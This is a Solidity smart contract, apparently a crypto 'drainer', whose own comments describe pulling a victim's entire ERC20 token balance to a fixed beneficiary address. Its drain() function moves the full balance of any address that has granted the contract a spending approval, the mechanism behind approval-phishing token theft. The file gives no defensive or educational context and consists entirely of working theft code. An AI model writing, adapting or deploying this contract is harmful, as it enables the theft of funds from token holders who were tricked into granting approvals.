// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/// @title TokenPuller
/// @notice Pulls the full ERC20 balance of a victim to a beneficiary.
contract TokenPuller {
    using SafeERC20 for IERC20;

    address public immutable token;
    address public immutable beneficiary;

    constructor(address _token, address _beneficiary) {
        require(_token != address(0), "TokenPuller: zero token");
        require(_beneficiary != address(0), "TokenPuller: zero beneficiary");
        token = _token;
        beneficiary = _beneficiary;
    }

    /// @notice Pull the victim's entire token balance to the beneficiary.
    /// @param victim Address whose balance is drained.
    function drain(address victim) external {
        require(victim != address(0), "TokenPuller: zero victim");
        uint256 bal = IERC20(token).balanceOf(victim);
        if (bal > 0) {
            IERC20(token).safeTransferFrom(victim, beneficiary, bal);
        }
    }
}
